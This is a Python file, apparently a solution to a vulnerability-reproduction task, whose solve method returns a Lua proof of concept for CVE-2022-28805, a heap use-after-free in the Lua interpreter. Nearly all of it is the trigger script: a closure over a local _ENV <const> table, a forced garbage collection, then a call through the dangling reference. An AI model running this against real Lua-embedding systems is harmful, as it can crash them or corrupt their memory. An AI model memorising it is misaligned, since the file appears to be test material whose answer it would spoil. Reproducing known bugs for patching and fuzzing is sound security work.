import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generates a PoC for CVE-2022-28805 (Heap Use After Free in Lua)
        # The vulnerability occurs because the compiler generates incorrect code for 
        # local _ENV <const> variables, failing to track them as upvalues properly.
        # This allows the local table to be garbage collected while the closure still 
        # holds a reference to the now-invalid stack slot or freed memory.
        
        poc = """
local function exploit()
  -- Create a table that will be our _ENV. 
  -- We give it some content to ensure it occupies heap memory.
  local t = { payload = "A" }
  
  -- Declare _ENV as a const local variable.
  -- The bug causes the compiler to fail to mark 't' as a captured upvalue.
  local _ENV <const> = t
  
  local function inner()
    -- Access a global variable. Since _ENV is 't', this accesses t.payload.
    -- If 't' has been collected, this causes a Use-After-Free.
    return payload
  end
  
  return inner
end

local f = exploit()

-- Force a full garbage collection cycle.
-- Because 't' was not correctly marked as an upvalue in 'f', 
-- the GC sees no references to 't' and collects it.
collectgarbage()

-- Call the closure. It attempts to access _ENV via the dangling upvalue/stack reference.
-- This triggers the heap use-after-free sanitizer error.
f()
"""
        return poc.encode('utf-8')